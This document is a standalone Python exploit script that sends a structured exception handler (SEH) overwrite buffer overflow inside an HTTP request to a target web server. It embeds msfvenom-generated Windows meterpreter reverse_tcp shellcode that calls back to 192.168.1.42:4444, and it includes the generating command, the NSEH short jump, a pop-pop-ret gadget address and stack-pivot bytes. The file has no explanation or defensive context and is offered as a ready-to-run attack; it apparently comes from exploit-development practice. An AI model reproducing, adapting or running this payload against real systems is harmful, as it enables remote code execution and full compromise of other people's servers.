#!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80


def send_exploit_request():

    size = 2000

    nopsled = b"\x90" * 100

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.42 LPORT=4444 EXITFUNC=thread -b "\x00\x09\x20\x0a\x0d" -f python -v shellcode > shellcode.txt
    shellcode =  b""
    shellcode += b"\xdb\xdc\xba\x9c\x3d\x2d\xf0\xd9\x74\x24\xf4"
    shellcode += b"\x58\x2b\xc9\xb1\x5e\x31\x50\x1a\x83\xc0\x04"
    shellcode += b"\x03\x50\x16\xe2\x69\xc1\xc5\x7f\x91\x3a\x16"
    shellcode += b"\xe0\xa0\xe8\x9f\x05\xa6\x87\xf2\xf5\xad\xca"
    shellcode += b"\xfe\x7e\xe3\xfe\xcf\x7f\x88\x8d\x07\x8f\x39"
    shellcode += b"\x3b\x7e\xbe\x85\x10\x42\xa1\x79\x6b\x97\x01"
    shellcode += b"\x40\xa4\xea\x40\x85\x72\x80\xad\x5b\x0e\x38"
    shellcode += b"\x22\x0c\x9b\xff\x7e\xb3\x4b\x74\x3e\xcb\xee"
    shellcode += b"\x4b\xcb\x67\xf0\x9b\x64\xfc\xaa\x3b\x0e\x4a"
    shellcode += b"\x53\x3d\xc3\xcf\xaa\x49\xdf\x86\xa7\x86\x94"
    shellcode += b"\x29\x47\xe7\x7c\x78\x77\x44\x41\xb5\x7a\x94"
    shellcode += b"\x85\x71\x65\xe3\xfd\x82\x18\xf4\xc5\xf9\xc6"
    shellcode += b"\x71\xda\x59\x8c\x22\x3e\x58\x41\xb4\xb5\x56"
    shellcode += b"\x2e\xb2\x92\x7a\xb1\x17\xa9\x86\x3a\x96\x7e"
    shellcode += b"\x0f\x78\xbd\x5a\x54\xda\xdc\xfb\x30\x8d\xe1"
    shellcode += b"\x1c\x9c\x72\x44\x56\x0e\x64\xf8\x97\xd1\x89"
    shellcode += b"\xa4\x0f\x1e\x44\x57\xd0\x08\xdf\x24\xe2\x97"
    shellcode += b"\x4b\xa3\x4e\x50\x52\x34\xc6\x76\x65\xea\x60"
    shellcode += b"\x16\x9b\x0b\x91\x3f\x58\x5f\xc1\x57\x49\xe0"
    shellcode += b"\x8a\xa7\x76\x35\x26\xad\xe0\x76\x1f\xb0\xda"
    shellcode += b"\x1e\x62\xb2\x0b\x83\xeb\x54\x7b\x6b\xbc\xc8"
    shellcode += b"\x3c\xdb\x7c\xb8\xd4\x31\x73\xe7\xc5\x39\x59"
    shellcode += b"\x80\x6c\xd6\x34\xf9\x18\x4f\x1d\x71\xb8\x90"
    shellcode += b"\x8b\xfc\xfa\x1b\x3e\x01\xb4\xeb\x4b\x11\xa1"
    shellcode += b"\x8b\xb3\xe9\x32\x3e\xb4\x83\x36\xe8\xe3\x3b"
    shellcode += b"\x35\xcd\xc4\xe4\xc6\x38\x57\xe2\x39\xbd\x6e"
    shellcode += b"\x99\x0c\x2b\xcf\xf5\x70\xbb\xcf\x05\x27\xd1"
    shellcode += b"\xcf\x6d\x9f\x81\x83\x88\xe0\x1f\xb0\x01\x75"
    shellcode += b"\xa0\xe1\xf6\xde\xc8\x0f\x21\x28\x57\xef\x04"
    shellcode += b"\x2a\x90\x0f\xdb\x05\x39\x78\x23\x16\xb9\x78"
    shellcode += b"\x49\x96\xe9\x10\x86\xb9\x06\xd1\x67\x10\x4f"
    shellcode += b"\x79\xe2\xf5\x3d\x18\xf3\xdf\xe0\x84\xf4\xec"
    shellcode += b"\x38\x36\x8f\x9d\xbf\xb7\x70\xb4\xdb\xb7\x71"
    shellcode += b"\xb8\xdd\x84\xa4\x81\xab\xcb\x75\xb6\xb4\xd1"
    shellcode += b"\x53\xc3\x5c\x4c\x36\x6e\x01\x6f\xed\xad\x3c"
    shellcode += b"\xec\x07\x4e\xbb\xec\x62\x4b\x87\xaa\x9f\x21"
    shellcode += b"\x98\x5e\x9f\x96\x99\x4a"


    # offset - 4 to account for NSEH
    buffer  = b"A" * (1259 - len(nopsled) - len(shellcode))
    buffer += pack("<L", (0x06eb9090)) # (NSEH); short jump; NOP; NOP
    buffer += pack("<L", (0x10015628)) # (SEH) 0x10015628: pop esi ; pop ebx ; ret  ;  (1 found)
    buffer += b'\x90\x90' # Stack alignment NOP
    buffer += b'\x66\x81\xC4\xE8\x06' # add sp,0x6e8
    buffer += b'\xFF\xE4' # jmp esp
    buffer += b"D" * (size - len(buffer))
    payload = nopsled + shellcode + buffer

    #HTTP Request
    request  = payload + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.recv(1024)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()